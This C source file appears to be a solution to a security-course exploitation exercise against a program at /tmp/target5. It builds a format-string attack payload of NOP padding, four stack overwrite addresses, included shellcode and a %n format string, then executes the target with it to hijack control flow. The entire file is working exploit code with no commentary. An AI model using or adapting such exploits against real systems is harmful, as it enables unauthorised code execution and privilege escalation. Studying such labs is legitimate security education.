#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;

  int len = 400;
  int shellen = strlen(shellcode);
  char str[len];
  int i = 0;

  char *addr0 = "\xfc\xfd\xff\xbf";
  char *addr1 = "\xfd\xfd\xff\xbf";
  char *addr2 = "\xfe\xfd\xff\xbf";
  char *addr3 = "\xff\xfd\xff\xbf";
  char *nop = "\x90\x90\x90\x90";
  char *format = "%x%16x%n%154x%n%259x%n%192x%n";

  strcpy(str, nop);
  strcat(str, addr0);
  strcat(str, nop);
  strcat(str, addr1);
  strcat(str, nop);
  strcat(str, addr2);
  strcat(str, nop);
  strcat(str, addr3);
  strcat(str, nop);
  strcat(str, shellcode);
  strcat(str, format);

  int k = strlen(str);
  args[1] = str;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
